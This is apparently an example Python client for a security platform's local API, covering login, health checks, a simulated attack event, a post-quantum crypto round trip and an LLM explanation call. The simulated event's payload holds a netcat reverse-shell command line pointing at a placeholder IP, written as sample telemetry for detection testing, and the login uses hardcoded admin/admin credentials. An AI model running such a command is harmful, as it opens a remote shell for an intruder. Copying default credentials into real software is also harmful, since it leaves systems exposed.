"""
Advanced Example: Full API integration with all endpoints.

Demonstrates:
- Authentication
- Threat simulation
- PQC operations
- Federated learning
- Real DeepSeek LLM calls (if key available)
"""
import requests
import json
import time

BASE = "http://localhost:8443"
TOKEN = None

def login():
    global TOKEN
    r = requests.post(f"{BASE}/api/auth/login", json={
        "username": "admin",
        "password": "admin"
    })
    TOKEN = r.json().get("token")
    print(f"Logged in, token: {TOKEN[:20]}...")

def auth_headers():
    return {"Authorization": f"Bearer {TOKEN}"}

def health():
    r = requests.get(f"{BASE}/api/healthz")
    print(f"Health: {r.json()}")

def simulate_attack():
    """Simulate a critical event"""
    r = requests.post(f"{BASE}/api/simulate/attack", 
                      headers=auth_headers(),
                      json={
                          "type": "process_anomaly",
                          "severity": "critical",
                          "payload": {
                              "pid": 4242,
                              "name": "nc",
                              "cmdline": "nc -e /bin/sh 1.2.3.4 4444"
                          }
                      })
    print(f"Attack simulation: {r.json()}")

def pqc_roundtrip():
    """Test PQC operations via API"""
    r = requests.post(f"{BASE}/api/crypto/real_pqc/roundtrip",
                      headers=auth_headers(),
                      json={"algorithm": "Kyber512"})
    print(f"PQC roundtrip: {r.json()}")

def explain_event(event_id):
    """Get LLM explanation of an event"""
    r = requests.post(f"{BASE}/api/llm/explain",
                      headers=auth_headers(),
                      json={"event_id": event_id})
    print(f"LLM explanation: {r.json()}")

if __name__ == "__main__":
    health()
    login()
    simulate_attack()
    pqc_roundtrip()
    print("Done.")
